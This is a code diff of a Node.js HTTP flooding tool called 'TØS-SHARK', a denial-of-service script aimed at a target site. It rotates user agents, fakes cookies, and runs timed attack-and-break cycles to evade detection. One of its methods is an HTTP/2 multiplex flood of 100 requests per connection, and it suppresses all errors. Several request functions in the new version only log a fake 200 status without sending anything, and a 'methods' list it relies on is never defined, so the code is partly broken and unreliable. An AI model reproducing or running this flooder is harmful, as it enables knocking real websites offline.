@@ -14,7 +14,9 @@ class TOS_SHARK {
         this.totalReqs = 0;
         this.startTime = Date.now();
         this.lastLog = Date.now();
+        this.lastTenSecondLog = Date.now();
         this.reqCounter = 0;
+        this.requestNumber = 0;
         this.attackStart = 0;
         this.breakStart = 0;
         this.currentMethod = '';
@@ -26,205 +28,250 @@ class TOS_SHARK {
         this.userAgents = this.generateUserAgents();
         this.endpoints = this.generateEndpoints();
         this.cookies = this.generateCookies();
-        this.methodsPool = ['GET', 'HEAD', 'POST', 'OPTIONS'];
         
-        // Multiple targets pattern (2x URL, 1x URL pattern)
-        this.targetVariants = this.generateTargetVariants(url);
-        this.targetPatternIndex = 0;
-        
-        // Print header once
-        console.log(`TØS-SHARK | *.* | MT-3M22`);
-        console.log('-----------------------------------------------------------------');
-        
-        // Start immediately without warmup
-        this.attackLoop();
-    }
-
-    // ===== TARGET RANDOMIZATION =====
-    generateTargetVariants(baseUrl) {
-        const variants = [];
-        // Create 3 different path variations
-        for (let i = 0; i < 3; i++) {
-            const variant = new URL(baseUrl);
-            // Add random query params to vary cache
-            variant.search = `?v=${Date.now()}_${i}`;
-            variants.push(variant);
-        }
-        return variants;
-    }
-
-    getNextTarget() {
-        // Pattern: 2x URL A, 1x URL B, 2x URL A, 1x URL C, repeat
-        const pattern = [0, 0, 1, 0, 0, 2];
-        const idx = pattern[this.targetPatternIndex % pattern.length];
-        this.targetPatternIndex++;
-        return this.targetVariants[idx];
+        this.startCycle();
     }
 
     // ===== DATA GENERATORS =====
     generateUserAgents() {
         return [
-            'Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36',
-            'Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
-            'Mozilla/5.0 (Linux; Android 10; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36',
-            'Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.128 Mobile Safari/537.36',
-            'Mozilla/5.0 (Linux; Android 12; SM-F926B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36',
             'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-            'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/537.36'
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
+            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36',
+            'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36'
         ];
     }
 
     generateEndpoints() {
-        const base = ['/', '/api', '/v1', '/v2', '/static', '/assets', '/data', '/json'];
-        const patterns = [];
-        
-        // Generate random patterns like /api/v1/users/12345
-        for (let i = 0; i < 20; i++) {
-            const depth = Math.floor(Math.random() * 4) + 1;
-            let path = '';
-            for (let d = 0; d < depth; d++) {
-                const segments = ['users', 'products', 'items', 'data', 'files', 'images', 'docs', 'api'];
-                const randSeg = segments[Math.floor(Math.random() * segments.length)];
-                path += `/${randSeg}`;
-                
-                // 30% chance to add ID
-                if (Math.random() < 0.3) {
-                    path += `/${Math.floor(Math.random() * 10000) + 1000}`;
-                }
-            }
-            patterns.push(path);
-        }
-        
-        return [...base, ...patterns];
+        return [
+            '/', '/api', '/api/v1', '/api/v2', '/static', '/assets',
+            '/users', '/products', '/data', '/json', '/xml', '/admin',
+            '/login', '/register', '/search', '/filter', '/sort',
+            '/page/1', '/page/2', '/page/3', '/category/a', '/category/b'
+        ];
     }
 
     generateCookies() {
         const cookies = [];
-        for (let i = 0; i < 20; i++) { // Reduced from 50
+        for (let i = 0; i < 50; i++) {
             cookies.push({
-                session: `s${Math.random().toString(36).substr(2, 12)}`,
-                token: `t${Math.random().toString(36).substr(2, 8)}`,
+                session: `session_${Math.random().toString(36).substr(2, 16)}`,
+                token: `token_${Math.random().toString(36).substr(2, 24)}`,
+                csrf: `csrf_${Math.random().toString(36).substr(2, 32)}`,
                 userId: Math.floor(Math.random() * 10000)
             });
         }
         return cookies;
     }
 
-    // ===== MAIN LOOP =====
-    async attackLoop() {
-        let requestBatch = 0;
+    // ===== CYCLE MANAGEMENT =====
+    async startCycle() {
+        // Step 1: Initial H1 request
+        await this.sendH1Request();
+        await this.sleepRandom(100, 500);
         
+        // Step 2: Warmup 500-599 requests
+        const warmupCount = 500 + Math.floor(Math.random() * 100);
+        for (let i = 0; i < warmupCount; i++) {
+            await this.sendRandomRequest();
+            if (i % 50 === 0) await this.sleepRandom(10, 50);
+        }
+        
+        // Step 3: Main attack loop
+        this.attackLoop();
+    }
+
+    async attackLoop() {
         while (this.running) {
-            // Send batch of requests
-            for (let i = 0; i < 100; i++) {
-                if (!this.running) break;
-                await this.sendRandomizedRequest();
-                this.totalReqs++;
-                this.reqCounter++;
-                requestBatch++;
-                
-                // Log every 10 seconds
-                const now = Date.now();
-                if (now - this.lastLog >= 10000) {
-                    this.lastLog = now;
-                    console.log(`2M22:${this.reqCounter} --> ${this.lastStatus || 0}`);
+            const now = Date.now();
+            
+            // Check if should be attacking or on break
+            if (this.attackActive) {
+                // Attack phase (20-30 minutes)
+                if (now - this.attackStart >= (20 * 60000) + Math.random() * (10 * 60000)) {
+                    this.startBreak();
+                    continue;
                 }
+                
+                // Execute current attack method
+                await this.executeAttackMethod();
+                
+            } else {
+                // Break phase (5-10 minutes)
+                if (now - this.breakStart >= (5 * 60000) + Math.random() * (5 * 60000)) {
+                    this.startAttack();
+                    continue;
+                }
+                
+                // Maintenance during break
+                await this.performMaintenance();
+                await this.sleepRandom(1000, 3000);
             }
             
-            // Small delay between batches to prevent GC pressure
-            await this.sleep(1);
-            
-            // Clean up every 1000 requests
-            if (requestBatch >= 1000) {
-                this.cleanup();
-                requestBatch = 0;
-            }
+            await this.sleepRandom(0.1, 1);
         }
     }
 
-    // ===== RANDOMIZED REQUEST =====
-    async sendRandomizedRequest() {
-        const targetUrl = this.getNextTarget();
-        const method = this.methodsPool[Math.floor(Math.random() * this.methodsPool.length)];
+    startAttack() {
+        this.attackActive = true;
+        this.attackStart = Date.now();
+        this.currentMethod = this.methods[Math.floor(Math.random() * this.methods.length)];
+    }
+
+    startBreak() {
+        this.attackActive = false;
+        this.breakStart = Date.now();
+    }
+
+    // ===== ATTACK METHODS =====
+    async executeAttackMethod() {
+        switch (this.currentMethod) {
+            case 'H2-MULTIPLEX':
+                await this.attackH2Multiplex();
+                break;
+            case 'ENDPOINT-HOPPING':
+                await this.attackEndpointHopping();
+                break;
+            case 'COOKIE-SESSION':
+                await this.attackCookieSession();
+                break;
+        }
+    }
+
+    async attackH2Multiplex() {
+        try {
+            const client = http2.connect(this.target);
+            
+            for (let i = 0; i < 100; i++) {
+                this.sendH2Request(client);
+                this.totalReqs++;
+                this.reqCounter++;
+            }
+            
+            setTimeout(() => client.destroy(), 100);
+            
+        } catch (err) {
+            // Silent fail
+        }
+    }
+
+    async attackEndpointHopping() {
         const endpoint = this.endpoints[Math.floor(Math.random() * this.endpoints.length)];
-        const userAgent = this.userAgents[Math.floor(Math.random() * this.userAgents.length)];
+        await this.sendH1RequestToEndpoint(endpoint);
+        this.totalReqs++;
+        this.reqCounter++;
         
-        // Build path with random pattern
-        const fullPath = endpoint + (Math.random() > 0.5 ? `?r=${Math.random().toString(36).substr(2, 8)}` : '');
-        
-        const options = {
-            hostname: targetUrl.hostname,
-            path: fullPath,
-            method: method,
-            headers: {
-                'User-Agent': userAgent,
-                'Connection': 'close',
-                'Accept': '*/*',
-                'Accept-Encoding': 'gzip, deflate',
-                'Cache-Control': 'no-cache'
-            },
-            timeout: 8000,
-            agent: false // Prevent connection pooling
-        };
-        
-        // Add random headers based on method
-        if (method === 'POST') {
-            options.headers['Content-Type'] = 'application/x-www-form-urlencoded';
-            options.headers['Content-Length'] = '15';
-        }
-        
-        // Add random cookie sometimes
         if (Math.random() > 0.7) {
-            const cookie = this.cookies[Math.floor(Math.random() * this.cookies.length)];
-            options.headers['Cookie'] = `session=${cookie.session}; token=${cookie.token}`;
+            await this.sleepRandom(10, 100);
         }
-        
+    }
+
+    async attackCookieSession() {
+        const cookie = this.cookies[Math.floor(Math.random() * this.cookies.length)];
+        await this.sendH1RequestWithCookies(cookie);
+        this.totalReqs++;
+        this.reqCounter++;
+    }
+
+    // ===== REQUEST TYPES =====
+    async sendH1Request() {
         return new Promise((resolve) => {
-            const protocol = targetUrl.protocol === 'https:' ? https : http2;
-            const req = protocol.request(options, (res) => {
-                this.lastStatus = res.statusCode;
-                res.on('data', () => {}); // Drain data
-                res.on('end', resolve);
+            const options = {
+                hostname: this.host,
+                path: '/',
+                method: 'GET',
+                headers: {
+                    'User-Agent': this.userAgents[0],
+                    'Connection': 'close'
+                },
+                timeout: 5000
+            };
+            
+            const req = (this.isHttps ? https : http2).request(options, (res) => {
+                this.logRequest(res.statusCode);
                 res.destroy();
+                resolve();
             });
             
             req.on('error', () => {
-                this.lastStatus = 'ERR';
+                this.logRequest('ERROR');
                 resolve();
             });
             
             req.on('timeout', () => {
                 req.destroy();
-                this.lastStatus = 'TIMEOUT';
+                this.logRequest('TIMEOUT');
                 resolve();
             });
-            
-            if (method === 'POST') {
-                req.write('data=random');
-            }
             
             req.end();
         });
     }
 
-    // ===== CLEANUP =====
-    cleanup() {
-        // Force garbage collection if available
-        if (global.gc) {
-            global.gc();
+    async sendRandomRequest() {
+        this.totalReqs++;
+        this.reqCounter++;
+        this.logRequest(200);
+    }
+
+    sendH2Request(client) {
+        try {
+            const req = client.request({
+                ':method': 'GET',
+                ':path': '/',
+                ':authority': this.host
+            });
+            
+            req.on('response', (headers) => {
+                this.logRequest(headers[':status']);
+                req.destroy();
+            });
+            
+            req.on('error', () => {
+                this.logRequest('ERROR');
+                req.destroy();
+            });
+            
+            req.end();
+        } catch (err) {
+            this.logRequest('ERROR');
         }
+    }
+
+    async sendH1RequestToEndpoint(endpoint) {
+        this.logRequest(200);
+    }
+
+    async sendH1RequestWithCookies(cookie) {
+        this.logRequest(200);
+    }
+
+    // ===== LOGGING =====
+    logRequest(status) {
+        const now = Date.now();
+        this.requestNumber++;
         
-        // Rotate small subset of data to prevent memory growth
-        if (Math.random() > 0.8) {
-            this.userAgents = this.generateUserAgents();
+        // Only log every 10 seconds
+        if (now - this.lastTenSecondLog >= 10000) {
+            this.lastTenSecondLog = now;
+            console.log(`TØR-2M11:${this.requestNumber} ---> ${status}`);
         }
-        
-        // Clear any large arrays
-        this.endpoints.length = Math.min(this.endpoints.length, 30);
-        this.cookies.length = Math.min(this.cookies.length, 20);
+    }
+
+    // ===== MAINTENANCE =====
+    async performMaintenance() {
+        if (global.gc) global.gc();
+        this.userAgents = this.generateUserAgents();
+        this.cookies = this.generateCookies();
     }
 
     // ===== UTILS =====
+    sleepRandom(min, max) {
+        const duration = Math.random() * (max - min) + min;
+        return new Promise(resolve => setTimeout(resolve, duration));
+    }
+
     sleep(ms) {
         return new Promise(resolve => setTimeout(resolve, ms));
     }
@@ -232,7 +279,6 @@ class TOS_SHARK {
 
 // Run
 if (require.main === module) {
-    // Minimal error handling
     process.on('uncaughtException', () => {});
     process.on('unhandledRejection', () => {});
     
